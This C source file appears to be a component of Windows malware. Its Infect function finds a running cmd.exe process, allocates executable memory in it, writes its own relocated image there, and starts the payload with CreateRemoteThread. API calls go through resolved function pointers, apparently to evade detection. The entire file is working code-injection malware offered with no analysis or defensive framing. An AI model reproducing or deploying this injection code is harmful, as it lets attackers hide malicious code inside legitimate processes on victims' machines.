#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>

#include "infect.h"
#include "init.h"

void Infect(DWORD dwImageBase) {
	// get self module base
	DWORD dwSelfImageBase = dwImageBase;
	// get DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(dwSelfImageBase);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)(dwSelfImageBase + pidh->e_lfanew);

	// read own memory
	Debug(L"Reading own memory...");
	LPBYTE lpSelf = (LPBYTE)(fnHeapAlloc(fnGetProcessHeap(), HEAP_ZERO_MEMORY, pinh->OptionalHeader.SizeOfImage));
	CopyMemory(lpSelf, (LPVOID)dwSelfImageBase, pinh->OptionalHeader.SizeOfImage);

	Debug(L"Getting process");
	// select target process
	SYSTEM_INFO si;
	LPVOID lpAddress = NULL;
	HANDLE hProcess = NULL;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// check whether machine architecture is 32-/64-bit
	fnGetNativeSystemInfo(&si);
	HANDLE hSnapshot = fnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (fnProcess32FirstW(hSnapshot, &pe32)) {
		while (fnProcess32NextW(hSnapshot, &pe32)) {
			if (wcsicmp(pe32.szExeFile, L"cmd.exe")) continue;
			BOOL bWow64 = FALSE;
			hProcess = fnOpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
			if (hProcess && (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL || (fnIsWow64Process(hProcess, &bWow64) && bWow64))) {
				// check if same process
				WCHAR szModuleName[MAX_PATH];
				fnGetModuleFileNameW(NULL, szModuleName, MAX_PATH);
				if (fnStrStrIW(szModuleName, pe32.szExeFile)) {
					fnCloseHandle(hProcess);
					continue;
				}
				// allocate space in process
				lpAddress = fnVirtualAllocEx(hProcess, NULL, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				if (lpAddress) {
					Debug(L"Got %s", pe32.szExeFile);
					break;
				}
				fnCloseHandle(hProcess);
			}
		}
		if (!hProcess || !lpAddress)
			return Debug(L"Out of processes");
	}
	fnCloseHandle(hSnapshot);

	Debug(L"Relocating base");
	// get allocated address's module base
	DWORD dwTargetImageBase = (DWORD)(lpAddress);
	// get delta for base relocation
	DWORD dwDelta = dwTargetImageBase > dwSelfImageBase ? dwTargetImageBase - dwSelfImageBase : dwSelfImageBase - dwTargetImageBase;
	if (BaseRelocate((LPVOID)(lpSelf), pinh, dwDelta)) {
		Debug(L"Infecting process");
		// write to target process
		if (fnWriteProcessMemory(hProcess, lpAddress, lpSelf, pinh->OptionalHeader.SizeOfImage, NULL)) {
			// get export table to location Start exported function
			PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)(dwSelfImageBase + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			// get address of Start function (first (and only) export function
			DWORD dwEntryPoint = dwTargetImageBase + ((LPDWORD)(dwSelfImageBase + pied->AddressOfFunctions))[0];
			Debug(L"Executing");
			// execute
			HANDLE hThread = fnCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(dwEntryPoint), (LPVOID)(dwTargetImageBase), 0, NULL);
		} else
			return Debug(L"Failed to write process: %lu", fnGetLastError());
	}

	fnHeapFree(GetProcessHeap(), 0, lpSelf);
	fnCloseHandle(hProcess);
}